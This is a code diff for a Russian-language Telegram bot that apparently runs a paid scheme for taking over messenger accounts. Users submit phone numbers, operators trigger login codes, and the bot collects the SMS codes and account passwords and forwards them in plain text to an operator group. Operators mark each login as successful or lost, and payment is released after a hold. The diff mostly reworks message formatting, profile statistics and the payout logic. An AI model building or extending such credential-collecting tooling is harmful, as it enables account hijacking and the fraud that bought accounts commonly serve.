@@ -320,20 +320,46 @@ def show_profile(message):
     c.execute('SELECT * FROM users WHERE user_id=?', (message.chat.id,))
     user = c.fetchone()
     if not user: show_main_menu(message.chat.id, message.message_id); conn.close(); return
-    c.execute('SELECT COUNT(*) as t, SUM(CASE WHEN status="completed" THEN 1 ELSE 0 END) as ok, SUM(CASE WHEN status="failed" THEN 1 ELSE 0 END) as fl, SUM(CASE WHEN status IN ("taken","waiting") THEN 1 ELSE 0 END) as ip FROM code_queue WHERE user_id=?', (message.chat.id,))
-    cs = c.fetchone()
-    c.execute('SELECT COUNT(*) as t, SUM(CASE WHEN status="completed" THEN 1 ELSE 0 END) as ok, SUM(CASE WHEN status="failed" THEN 1 ELSE 0 END) as fl, SUM(CASE WHEN status IN ("taken","waiting") THEN 1 ELSE 0 END) as ip FROM qr_queue WHERE user_id=?', (message.chat.id,))
-    qs = c.fetchone()
-    total = (cs[0] or 0) + (qs[0] or 0)
-    ok = (cs[1] or 0) + (qs[1] or 0)
-    fl = (cs[2] or 0) + (qs[2] or 0)
-    ip = (cs[3] or 0) + (qs[3] or 0)
+    
+    c.execute('''
+        SELECT 
+            COUNT(*) as total,
+            SUM(CASE WHEN status="completed" THEN 1 ELSE 0 END) as completed,
+            SUM(CASE WHEN status="failed" THEN 1 ELSE 0 END) as failed,
+            SUM(CASE WHEN status IN ("taken","waiting") THEN 1 ELSE 0 END) as in_progress
+        FROM code_queue WHERE user_id=?
+    ''', (message.chat.id,))
+    code_stats = c.fetchone()
+    
+    c.execute('''
+        SELECT 
+            COUNT(*) as total,
+            SUM(CASE WHEN status="completed" AND completed=1 THEN 1 ELSE 0 END) as completed,
+            SUM(CASE WHEN status="failed" THEN 1 ELSE 0 END) as failed,
+            SUM(CASE WHEN status IN ("taken","waiting") THEN 1 ELSE 0 END) as in_progress
+        FROM qr_queue WHERE user_id=?
+    ''', (message.chat.id,))
+    qr_stats = c.fetchone()
+    
+    total = (code_stats[0] or 0) + (qr_stats[0] or 0)
+    ok = (code_stats[1] or 0) + (qr_stats[1] or 0)
+    fl = (code_stats[2] or 0) + (qr_stats[2] or 0)
+    ip = (code_stats[3] or 0) + (qr_stats[3] or 0)
     rate = (ok/total*100) if total > 0 else 0
+    
+    c.execute('SELECT phone_number, status FROM code_queue WHERE user_id=? AND status IN ("taken","waiting") ORDER BY created_at DESC', (message.chat.id,))
+    active_codes = c.fetchall()
+    
+    c.execute('SELECT id, status FROM qr_queue WHERE user_id=? AND status IN ("taken","waiting") ORDER BY created_at DESC', (message.chat.id,))
+    active_qrs = c.fetchall()
+    
     c.execute('SELECT amount, description FROM transactions WHERE user_id=? ORDER BY created_at DESC LIMIT 1', (message.chat.id,))
     lt = c.fetchone()
+    
     c.execute('SELECT COUNT(*) FROM withdraw_requests WHERE user_id=? AND status="pending"', (message.chat.id,))
     pw = c.fetchone()[0]
     conn.close()
+    
     text = (
         "╭━━━━━━━━━━━━━━━━━━╮\n"
         "│  👤 **МОЙ ПРОФИЛЬ**   │\n"
@@ -344,22 +370,43 @@ def show_profile(message):
         f"└─ {'🟢 В работе' if ip > 0 else '⚪ Ожидание'}\n\n"
         "💰 **Финансы**\n"
         f"├─ 💎 Баланс: **${user[2]:.2f}**\n"
-        f"├─ 🔒 В холде: ${user[4]:.2f}\n"
+        f"├─ 🔒 В холде: **${user[4]:.2f}**\n"
         f"├─ 💵 Заработано: ${user[3]:.2f}\n"
         f"└─ 💳 Выведено: ${user[5]:.2f}\n\n"
         "📊 **Статистика**\n"
-        f"├─ 📝 Всего: {total}\n"
+        f"├─ 📝 Всего заказов: {total}\n"
         f"├─ ✅ Успешно: {ok} ({rate:.0f}%)\n"
         f"├─ ⏳ В работе: {ip}\n"
         f"└─ ❌ Отменено: {fl}"
     )
-    if lt: text += f"\n\n💼 **Последняя операция**\n└─ {lt[1]}: ${lt[0]:.2f}"
-    if pw > 0: text += f"\n\n⚠️ Заявок на вывод: {pw}"
+    
+    if active_codes:
+        text += f"\n\n📱 **Номера в работе:**\n"
+        for num in active_codes[:5]:
+            status_text = "🔄 Обрабатывается" if num[1] == "taken" else "⏳ В очереди"
+            text += f"├─ `{num[0]}` — {status_text}\n"
+    
+    if active_qrs:
+        text += f"\n📷 **QR в работе:**\n"
+        for qr in active_qrs[:5]:
+            status_text = "🔄 Обрабатывается" if qr[1] == "taken" else "⏳ В очереди"
+            text += f"├─ QR #{qr[0]} — {status_text}\n"
+    
+    if lt: 
+        text += f"\n\n💼 **Последняя операция**\n└─ {lt[1]}: ${lt[0]:.2f}"
+    
+    if pw > 0: 
+        text += f"\n\n⚠️ Заявок на вывод: {pw}"
+    
     markup = types.InlineKeyboardMarkup(row_width=1)
-    if user[2] > 0: markup.add(types.InlineKeyboardButton("💳 Вывести средства", callback_data='withdraw'))
+    if user[2] > 0: 
+        markup.add(types.InlineKeyboardButton("💳 Вывести средства", callback_data='withdraw'))
     markup.add(types.InlineKeyboardButton("◀️ В меню", callback_data='back_to_menu'))
-    try: bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)
-    except: bot.send_message(message.chat.id, text, parse_mode='Markdown', reply_markup=markup)
+    
+    try: 
+        bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)
+    except: 
+        bot.send_message(message.chat.id, text, parse_mode='Markdown', reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: call.data == 'instruction')
 def show_instruction(call):
@@ -402,9 +449,11 @@ def akk_command(message):
     markup = types.InlineKeyboardMarkup(row_width=2)
     markup.add(types.InlineKeyboardButton("📱 Код", callback_data='get_code'), types.InlineKeyboardButton("📷 QR", callback_data='get_qr'))
     bot.send_message(message.chat.id,
-        "🔍 **ВЫБЕРИТЕ ТИП ЗАЯВКИ**\n\n"
-        "📱 Код — номер и SMS\n"
-        "📷 QR — заявка и фото",
+        "🔍 **ВЫБОР ЗАЯВКИ**\n\n"
+        "📱 **Код** — получите номер\n"
+        "└─ отправьте SMS с кодом\n\n"
+        "📷 **QR** — получите заявку\n"
+        "└─ отправьте фото QR-кода",
         parse_mode='Markdown', reply_markup=markup,
         message_thread_id=message.message_thread_id if message.is_topic_message else None)
 
@@ -422,11 +471,14 @@ def get_next_code(call):
         markup = types.InlineKeyboardMarkup(row_width=2)
         markup.add(types.InlineKeyboardButton("📤 Отправил код", callback_data=f'send_code_{code[0]}'), types.InlineKeyboardButton("⏭ Пропустить", callback_data=f'skip_code_{code[0]}'))
         bot.edit_message_text(
-            f"📱 **ЗАЯВКА #{code[0]}**\n\n"
-            f"Номер: `{code[2]}`\n\n"
+            f"╭━━━━━━━━━━━━━━━━━━╮\n"
+            f"│  📱 **ЗАЯВКА #{code[0]}**  │\n"
+            f"╰━━━━━━━━━━━━━━━━━━╯\n\n"
+            f"📱 Номер: `{code[2]}`\n\n"
             f"1️⃣ Отправьте код на номер\n"
             f"2️⃣ Нажмите «Отправил код»\n"
-            f"3️⃣ Пользователь введет код",
+            f"3️⃣ Пользователь введет код\n\n"
+            f"⏭ Пропустить — вернуть в очередь",
             call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
         try: bot.send_message(code[1], "📨 **Номер взят в работу**\n\nОжидайте SMS с кодом\n⏱ 5-10 минут", parse_mode='Markdown')
         except: pass
@@ -454,14 +506,14 @@ def handle_send_code(call):
             parse_mode='Markdown', reply_markup=markup)
         except: pass
         bot.answer_callback_query(call.id, "✅ Запрос отправлен!")
-        markup = types.InlineKeyboardMarkup(row_width=1)
-        markup.add(types.InlineKeyboardButton("⏳ Ожидание ввода кода...", callback_data='waiting'), types.InlineKeyboardButton("⏭ Пропустить", callback_data=f'skip_code_{oid}'))
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("⏳ Ожидание ввода...", callback_data='waiting'))
         bot.edit_message_text(
             f"⏳ **ОЖИДАНИЕ КОДА**\n\n"
             f"📱 `{order[1]}`\n"
             f"📋 #{oid}\n\n"
-            f"Пользователь вводит код\n\n"
-            f"⏭ Нажмите «Пропустить» если код не приходит",
+            f"Пользователь вводит код\n"
+            f"Ожидайте...",
             call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
     else: bot.answer_callback_query(call.id, "❌ Не найдена", show_alert=True)
     conn.close()
@@ -503,14 +555,21 @@ def process_code_input(message):
         thread_id = None
         if hasattr(bot, 'order_threads') and oid in bot.order_threads: thread_id = bot.order_threads[oid]
         markup = types.InlineKeyboardMarkup(row_width=2)
-        markup.add(types.InlineKeyboardButton("✅ Встал", callback_data=f'code_success_{oid}'), types.InlineKeyboardButton("🔐 Пароль", callback_data=f'code_password_{oid}'))
+        markup.add(
+            types.InlineKeyboardButton("✅ Встал", callback_data=f'code_success_{oid}'),
+            types.InlineKeyboardButton("🔐 Пароль", callback_data=f'code_password_{oid}'),
+            types.InlineKeyboardButton("⏭ Пропустить", callback_data=f'skip_code_{oid}')
+        )
         send_to_group(
-            f"🔑 **ПОЛУЧЕН КОД**\n\n"
-            f"📱 `{order[1]}`\n"
+            f"╭━━━━━━━━━━━━━━━━━━╮\n"
+            f"│  🔑 **ПОЛУЧЕН КОД**  │\n"
+            f"╰━━━━━━━━━━━━━━━━━━╯\n\n"
+            f"📱 Номер: `{order[1]}`\n"
             f"🔢 Код: `{code}`\n"
-            f"📋 #{oid}\n\n"
+            f"📋 Заявка: #{oid}\n\n"
             f"✅ Встал — вход выполнен\n"
-            f"🔐 Пароль — запрос пароля",
+            f"🔐 Пароль — запрос пароля\n"
+            f"⏭ Пропустить — проблема",
             markup=markup, thread_id=thread_id)
         markup = types.InlineKeyboardMarkup()
         markup.add(types.InlineKeyboardButton("◀️ В меню", callback_data='back_to_menu'))
@@ -550,7 +609,11 @@ def handle_code_success(call):
         bot.hold_timers[f'code_{oid}'] = {'timer': timer, 'user_id': order[0], 'amount': price}
         markup = types.InlineKeyboardMarkup()
         markup.add(types.InlineKeyboardButton("❌ Слетел", callback_data=f'code_failed_{oid}'))
-        notification_text = f"✅ **ПОДТВЕРЖДЕНО**\n\n📱 Номер `{order[1]}` успешно встал"
+        notification_text = (
+            f"✅ **ПОДТВЕРЖДЕНО**\n\n"
+            f"📱 Номер `{order[1]}`\n"
+            f"успешно встал"
+        )
         if thread_id: send_to_group(notification_text, markup=markup, thread_id=thread_id)
         else:
             try: bot.edit_message_text(notification_text, call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
@@ -579,7 +642,10 @@ def handle_code_failed(call):
             f"🔄 Попробуйте другой номер",
             parse_mode='Markdown')
         except: pass
-        bot.edit_message_text(f"❌ **СЛЕТЕЛ**\n\n📱 Номер `{order[1]}` слетел", call.message.chat.id, call.message.message_id, parse_mode='Markdown')
+        bot.edit_message_text(
+            f"❌ **СЛЕТЕЛ**\n\n"
+            f"📱 Номер `{order[1]}` слетел",
+            call.message.chat.id, call.message.message_id, parse_mode='Markdown')
         bot.answer_callback_query(call.id, "❌ Слетел")
     else: bot.answer_callback_query(call.id, "❌ Не найдена", show_alert=True)
 
@@ -600,7 +666,10 @@ def handle_skip_code(call):
             f"🔄 Попробуйте другой номер",
             parse_mode='Markdown')
         except: pass
-        bot.edit_message_text(f"⏭ **ПРОПУЩЕН**\n\n📱 Номер `{order[1]}` пропущен", call.message.chat.id, call.message.message_id, parse_mode='Markdown')
+        bot.edit_message_text(
+            f"⏭ **ПРОПУЩЕН**\n\n"
+            f"📱 Номер `{order[1]}` пропущен",
+            call.message.chat.id, call.message.message_id, parse_mode='Markdown')
         bot.answer_callback_query(call.id, "⏭ Пропущен")
     else: bot.answer_callback_query(call.id, "❌ Не найдена", show_alert=True)
 
@@ -621,7 +690,12 @@ def handle_code_password(call):
                 parse_mode='Markdown')
             user_states[order[0]] = {'state': 'waiting_password', 'order_id': oid, 'phone': order[1], 'thread_id': thread_id}
         except: pass
-        bot.edit_message_text(f"🔐 **ЗАПРОШЕН ПАРОЛЬ**\n\n📱 `{order[1]}`\n📋 #{oid}\n\n⏱ Ожидание...", call.message.chat.id, call.message.message_id, parse_mode='Markdown')
+        bot.edit_message_text(
+            f"🔐 **ЗАПРОШЕН ПАРОЛЬ**\n\n"
+            f"📱 `{order[1]}`\n"
+            f"📋 #{oid}\n\n"
+            f"⏱ Ожидание пароля...",
+            call.message.chat.id, call.message.message_id, parse_mode='Markdown')
         bot.answer_callback_query(call.id, "🔐 Запрошен")
     else: bot.answer_callback_query(call.id, "❌ Не найдена", show_alert=True)
 
@@ -634,16 +708,24 @@ def process_password(message):
     thread_id = us.get('thread_id')
     del user_states[message.from_user.id]
     markup = types.InlineKeyboardMarkup(row_width=2)
-    markup.add(types.InlineKeyboardButton("✅ Встал", callback_data=f'code_success_{oid}'), types.InlineKeyboardButton("⏭ Пропустить", callback_data=f'skip_code_{oid}'))
+    markup.add(
+        types.InlineKeyboardButton("✅ Встал", callback_data=f'code_success_{oid}'),
+        types.InlineKeyboardButton("⏭ Пропустить", callback_data=f'skip_code_{oid}')
+    )
     send_to_group(
-        f"🔐 **ПОЛУЧЕН ПАРОЛЬ**\n\n"
+        f"╭━━━━━━━━━━━━━━━━━━╮\n"
+        f"│  🔐 **ПОЛУЧЕН ПАРОЛЬ** │\n"
+        f"╰━━━━━━━━━━━━━━━━━━╯\n\n"
         f"📱 `{phone}`\n"
         f"🔑 `{pw}`\n"
         f"📋 #{oid}\n\n"
         f"✅ Встал — вход выполнен\n"
         f"⏭ Пропустить — проблема",
         markup=markup, thread_id=thread_id)
-    bot.send_message(message.chat.id, "✅ **Пароль отправлен обработчику**\n\n⏱ Ожидайте подтверждение...", parse_mode='Markdown')
+    bot.send_message(message.chat.id,
+        "✅ **Пароль отправлен обработчику**\n\n"
+        "⏱ Ожидайте подтверждение...",
+        parse_mode='Markdown')
 
 def get_next_qr(call):
     conn = sqlite3.connect('max_bot.db')
@@ -658,10 +740,13 @@ def get_next_qr(call):
         bot.order_threads[qr[0]] = thread_id
         user_states[call.from_user.id] = {'state': 'waiting_qr_photo', 'qr_id': qr[0], 'user_id': qr[1]}
         bot.edit_message_text(
-            f"📷 **QR ЗАЯВКА #{qr[0]}**\n\n"
+            f"╭━━━━━━━━━━━━━━━━━━╮\n"
+            f"│  📷 **ЗАЯВКА #{qr[0]}**   │\n"
+            f"╰━━━━━━━━━━━━━━━━━━╯\n\n"
             f"👤 Пользователь: {qr[1]}\n\n"
             f"📸 Отправьте фото QR-кода\n"
-            f"📎 **ОТВЕТОМ** на это сообщение",
+            f"📎 **ОТВЕТОМ** на это сообщение\n\n"
+            f"⏭ Пропустить — вернуть в очередь",
             call.message.chat.id, call.message.message_id, parse_mode='Markdown')
         try: bot.send_message(qr[1], "📷 **QR в обработке**\n\nСкоро вам отправят QR-код", parse_mode='Markdown')
         except: pass
@@ -689,7 +774,12 @@ def handle_qr_photo(message):
                        "👇 Нажмите «Отсканировал» после",
                 parse_mode='Markdown', reply_markup=markup)
             except: bot.reply_to(message, "❌ Ошибка отправки"); return
-            bot.reply_to(message, f"✅ **QR ПЕРЕДАН**\n\n📋 #{qr_id}\n👤 {user_id}\n\nОжидайте сканирование", parse_mode='Markdown')
+            bot.reply_to(message,
+                f"✅ **QR ПЕРЕДАН**\n\n"
+                f"📋 #{qr_id}\n"
+                f"👤 {user_id}\n\n"
+                f"Ожидайте сканирование",
+                parse_mode='Markdown')
             del user_states[message.from_user.id]
 
 def handle_qr_scanned(call):
@@ -702,13 +792,20 @@ def handle_qr_scanned(call):
         thread_id = None
         if hasattr(bot, 'order_threads') and qr_id in bot.order_threads: thread_id = bot.order_threads[qr_id]
         markup = types.InlineKeyboardMarkup(row_width=2)
-        markup.add(types.InlineKeyboardButton("✅ Встал", callback_data=f'qr_success_{qr_id}'), types.InlineKeyboardButton("🔐 Пароль", callback_data=f'qr_password_{qr_id}'))
+        markup.add(
+            types.InlineKeyboardButton("✅ Встал", callback_data=f'qr_success_{qr_id}'),
+            types.InlineKeyboardButton("🔐 Пароль", callback_data=f'qr_password_{qr_id}'),
+            types.InlineKeyboardButton("⏭ Пропустить", callback_data=f'skip_qr_{qr_id}')
+        )
         send_to_group(
-            f"✅ **QR ОТСКАНИРОВАН**\n\n"
+            f"╭━━━━━━━━━━━━━━━━━━╮\n"
+            f"│  ✅ **QR ОТСКАНИРОВАН** │\n"
+            f"╰━━━━━━━━━━━━━━━━━━╯\n\n"
             f"📋 #{qr_id}\n"
             f"👤 {qr[2]}\n\n"
             f"✅ Встал — успешный вход\n"
-            f"🔐 Пароль — запрос пароля",
+            f"🔐 Пароль — запрос пароля\n"
+            f"⏭ Пропустить — проблема",
             markup=markup, thread_id=thread_id)
         try: bot.edit_message_caption("✅ **QR ОТСКАНИРОВАН**\n\n🎉 Подтверждено!\n⏱ Ожидайте подтверждение...", call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("⏳ Ожидание", callback_data='waiting')))
         except: bot.send_message(call.message.chat.id, "✅ **QR Отсканирован**\n\nОжидайте подтверждение...", parse_mode='Markdown')
@@ -719,6 +816,9 @@ def handle_qr_scanned(call):
 def handle_qr_success(call):
     qr_id = int(call.data.split('_')[2])
     thread_id = call.message.message_thread_id if hasattr(call.message, 'message_thread_id') else None
+    
+    logger.info(f"✅ Холодник нажал 'Встал' для QR заявки #{qr_id}")
+    
     conn = sqlite3.connect('max_bot.db')
     c = conn.cursor()
     c.execute('SELECT user_id FROM qr_queue WHERE id=?', (qr_id,))
@@ -729,6 +829,11 @@ def handle_qr_success(call):
         c.execute('UPDATE qr_queue SET status="completed", completed=1, completed_at=CURRENT_TIMESTAMP WHERE id=?', (qr_id,))
         c.execute('UPDATE users SET total_orders=total_orders+1 WHERE user_id=?', (qr[0],))
         conn.commit()
+        
+        c.execute('SELECT status, completed FROM qr_queue WHERE id=?', (qr_id,))
+        check = c.fetchone()
+        logger.info(f"🔍 ПРОВЕРКА QR #{qr_id}: status={check[0]}, completed={check[1]}")
+        
         conn.close()
         try: bot.send_message(qr[0],
             f"🎉 **QR УСПЕШНО ПРИНЯТ!**\n\n"
@@ -808,7 +913,9 @@ def process_qr_password(message):
     markup = types.InlineKeyboardMarkup(row_width=2)
     markup.add(types.InlineKeyboardButton("✅ Встал", callback_data=f'qr_success_{qr_id}'), types.InlineKeyboardButton("⏭ Пропустить", callback_data=f'skip_qr_{qr_id}'))
     send_to_group(
-        f"🔐 **ПОЛУЧЕН ПАРОЛЬ QR**\n\n"
+        f"╭━━━━━━━━━━━━━━━━━━╮\n"
+        f"│  🔐 **ПОЛУЧЕН ПАРОЛЬ** │\n"
+        f"╰━━━━━━━━━━━━━━━━━━╯\n\n"
         f"🔑 `{pw}`\n"
         f"📋 #{qr_id}\n\n"
         f"✅ Встал — вход выполнен\n"
@@ -818,7 +925,7 @@ def process_qr_password(message):
 
 def process_hold_payment(user_id, order_id, amount, order_type='code'):
     try:
-        logger.info(f"🕐 Холд завершен! Начисление ${amount} пользователю {user_id} за заказ #{order_id}")
+        logger.info(f"🕐 Холд завершен! Начисление ${amount} пользователю {user_id} за заказ #{order_id} ({order_type})")
         conn = sqlite3.connect('max_bot.db')
         c = conn.cursor()
         if order_type == 'code': c.execute('SELECT status, phone_number FROM code_queue WHERE id=?', (order_id,))
@@ -826,7 +933,11 @@ def process_hold_payment(user_id, order_id, amount, order_type='code'):
         order = c.fetchone()
         if not order: logger.error(f"❌ Заявка #{order_id} не найдена"); conn.close(); return
         status = order[0]
-        is_completed = (status == 'completed' and (order_type == 'code' or (len(order) > 1 and order[1] == 1)))
+        is_completed = False
+        if order_type == 'code': is_completed = (status == 'completed')
+        else:
+            if len(order) > 1: is_completed = (status == 'completed' and order[1] == 1)
+            else: is_completed = (status == 'completed')
         if is_completed:
             c.execute('UPDATE users SET balance=balance+?, total_earned=total_earned+? WHERE user_id=?', (amount, amount, user_id))
             if order_type == 'code' and len(order) > 1 and order[1]: desc = f'📱 {order[1]} — ${amount:.2f}'
@@ -834,8 +945,9 @@ def process_hold_payment(user_id, order_id, amount, order_type='code'):
             c.execute('INSERT INTO transactions (user_id, amount, type, description) VALUES (?,?,"income",?)', (user_id, amount, desc))
             c.execute('UPDATE users SET success_orders=success_orders+1 WHERE user_id=?', (user_id,))
             conn.commit()
-            c.execute('SELECT balance FROM users WHERE user_id=?', (user_id,))
-            new_balance = c.fetchone()[0]
+            c.execute('SELECT balance, hold_balance FROM users WHERE user_id=?', (user_id,))
+            user_data = c.fetchone()
+            new_balance = user_data[0]
             if order_type == 'code' and len(order) > 1 and order[1]: text = f"💰 **СРЕДСТВА ЗАЧИСЛЕНЫ**\n\n📱 Номер: `{order[1]}`\n💵 Сумма: **${amount:.2f}**\n💎 Баланс: **${new_balance:.2f}**\n\n✅ Холд завершен"
             else: text = f"💰 **СРЕДСТВА ЗАЧИСЛЕНЫ**\n\n📷 QR-код\n💵 Сумма: **${amount:.2f}**\n💎 Баланс: **${new_balance:.2f}**\n\n✅ Холд завершен"
             try: bot.send_message(user_id, text, parse_mode='Markdown')
